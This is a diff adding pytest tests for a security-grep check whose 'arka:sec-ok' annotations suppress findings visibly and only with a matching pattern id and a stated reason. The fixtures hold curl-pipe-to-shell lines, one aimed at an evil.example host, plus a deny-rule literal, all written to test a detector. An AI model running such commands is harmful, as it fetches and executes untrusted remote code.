@@ -70,6 +70,112 @@ def test_security_grep_passes_clean_file(tmp_path):
     assert report.overall == "pass"
 
 
+def test_security_grep_sec_ok_suppresses_named_pattern_visibly(tmp_path):
+    """A deny-rule literal with a correct arka:sec-ok annotation passes,
+    and the suppression is reported in the summary — never silent."""
+    rules = tmp_path / "spec.py"
+    rules.write_text(
+        '"Bash(curl * | sh*)",'  # arka:sec-ok(curl-pipe-shell): fixture
+        "  # arka:sec-ok(curl-pipe-shell): deny-rule literal\n",
+        encoding="utf-8",
+    )
+    report = run_evidence_checks(
+        tmp_path, changed_files=["spec.py"], checks=["security-grep"],
+    )
+    result = _result(report, "security-grep")
+    assert result.passed is True
+    assert "suppressed with arka:sec-ok justification" in result.summary
+    assert "curl-pipe-shell" in result.summary
+
+
+def test_security_grep_sec_ok_wrong_id_does_not_suppress(tmp_path):
+    bad = tmp_path / "spec.py"
+    bad.write_text(
+        '"Bash(curl * | sh*)",'  # arka:sec-ok(curl-pipe-shell): fixture
+        "  # arka:sec-ok(aws-access-key): wrong id\n",
+        encoding="utf-8",
+    )
+    report = run_evidence_checks(
+        tmp_path, changed_files=["spec.py"], checks=["security-grep"],
+    )
+    assert _result(report, "security-grep").passed is False
+
+
+def test_security_grep_sec_ok_requires_a_reason(tmp_path):
+    bad = tmp_path / "spec.py"
+    bad.write_text(
+        '"Bash(curl * | sh*)",'  # arka:sec-ok(curl-pipe-shell): fixture
+        "  # arka:sec-ok(curl-pipe-shell):\n",
+        encoding="utf-8",
+    )
+    report = run_evidence_checks(
+        tmp_path, changed_files=["spec.py"], checks=["security-grep"],
+    )
+    assert _result(report, "security-grep").passed is False
+
+
+def test_security_grep_sec_ok_only_covers_its_own_line(tmp_path):
+    bad = tmp_path / "deploy.py"
+    bad.write_text(
+        "# arka:sec-ok(curl-pipe-shell): annotation on another line\n"
+        'run("curl https://x.example/i.sh | sh")\n',  # arka:sec-ok(curl-pipe-shell): fixture
+        encoding="utf-8",
+    )
+    report = run_evidence_checks(
+        tmp_path, changed_files=["deploy.py"], checks=["security-grep"],
+    )
+    assert _result(report, "security-grep").passed is False
+
+
+def test_security_grep_suppressions_survive_summary_truncation(tmp_path):
+    """30 annotated lines: the string summary caps at 20 with an
+    explicit '+10 more suppressed' marker at the END (where _tail
+    keeps it), and the structured fields carry the FULL record —
+    bulk annotation can never be quiet."""
+    line = (
+        'run("curl https://x.example/i.sh | sh")'  # arka:sec-ok(curl-pipe-shell): fixture literal
+        "  # arka:sec-ok(curl-pipe-shell): fixture literal\n"
+    )
+    bad = tmp_path / "bulk.py"
+    bad.write_text(line * 30, encoding="utf-8")
+    report = run_evidence_checks(
+        tmp_path, changed_files=["bulk.py"], checks=["security-grep"],
+    )
+    result = _result(report, "security-grep")
+    assert result.passed is True
+    assert result.suppressed_count == 30
+    assert len(result.suppressions) == 30
+    assert result.summary.endswith("(+10 more suppressed)")
+    # Whole-file mode carries line numbers on every suppression entry.
+    assert result.suppressions[0].endswith("bulk.py:1 [curl-pipe-shell]")
+    assert result.suppressions[29].endswith("bulk.py:30 [curl-pipe-shell]")
+
+
+def test_security_grep_added_lines_mode_carries_line_numbers(tmp_path):
+    """In a git repo the sweep scans only added lines — findings must
+    still name the line in the NEW file, from the -U0 hunk headers."""
+    clean = "def ok():\n    return 1\n"
+    (tmp_path / "svc.py").write_text(clean, encoding="utf-8")
+    _git(tmp_path, "init", "-b", "master")
+    _git(tmp_path, "add", "svc.py")
+    _git(tmp_path, "commit", "-m", "clean")
+    (tmp_path / "svc.py").write_text(
+        clean
+        + 'run("curl https://x.io/i.sh | sh")\n'  # arka:sec-ok(curl-pipe-shell): fixture
+        + 'run("curl https://y.io/j.sh | sh")\n',  # arka:sec-ok(curl-pipe-shell): fixture
+        encoding="utf-8",
+    )
+    report = run_evidence_checks(
+        tmp_path, changed_files=["svc.py"], checks=["security-grep"],
+    )
+    result = _result(report, "security-grep")
+    assert result.passed is False
+    # Two ADJACENT added lines must carry consecutive numbers — pins
+    # the within-hunk lineno increment, not just the hunk-header seed.
+    assert "svc.py:3 [curl-pipe-shell]" in result.summary
+    assert "svc.py:4 [curl-pipe-shell]" in result.summary
+
+
 def test_security_grep_detects_curl_pipe_and_sql_fstring(tmp_path):
     bad = tmp_path / "deploy.sh"
     bad.write_text("curl https://evil.example/install.sh | sh\n", encoding="utf-8")
